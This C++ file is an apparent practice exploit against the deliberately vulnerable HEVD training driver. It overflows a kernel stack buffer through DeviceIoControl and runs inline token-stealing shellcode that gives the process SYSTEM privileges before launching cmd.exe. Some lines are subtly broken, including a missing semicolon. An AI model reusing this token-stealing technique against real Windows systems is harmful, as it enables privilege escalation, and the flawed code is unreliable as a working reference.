// HEVD_STACK_OVERFLOW.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <iostream>
#include <windows.h>

// 抄的shellcode
void shellcode()
{
	_asm
	{
		pop    edi
		pop    esi
		pop    ebx
		pushad
		mov eax, fs:[124h]		// 找到当前线程的_KTHREAD结构
		mov eax, [eax + 0x50]   // 找到_EPROCESS结构
		mov ecx, eax
		mov edx, 4				// edx = system PID(4)

		// 循环是为了获取system的_EPROCESS
		find_sys_pid :
					 mov eax, [eax + 0xb8]	// 找到进程活动链表
					 sub eax, 0xb8    		// 链表遍历
					 cmp[eax + 0xb4], edx    // 根据PID判断是否为SYSTEM
					 jnz find_sys_pid

					 // 替换Token
					 mov edx, [eax + 0xf8]
					 mov[ecx + 0xf8], edx
					 popad
					 pop ebp
					 ret 8
	}
}

int main()
{
	HANDLE hDevice = NULL;
	DWORD recv = NULL;

	hDevice = CreateFile(L"\\\\.\\HackSysExtremeVulnerableDriver",
		GENERIC_READ | GENERIC_WRITE,
		0,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL);

	if (FAILED(hDevice))
	{
		printf("Failed to open device\n");
		return 0;
	}


	char buffer[0x224];
	memset(buffer, 0x41, 0x224);
	DWORD shellcodeAddr = (DWORD)shellcode;
	memcpy(&buffer[0x220], &shellcodeAddr, 4);


	DeviceIoControl(hDevice, 0x222007, buffer, 0x224, NULL, NULL, &recv, NULL);

	system("start cmd.exe")
	CloseHandle(hDevice);
	std::cout << "Hello World!\n";
}
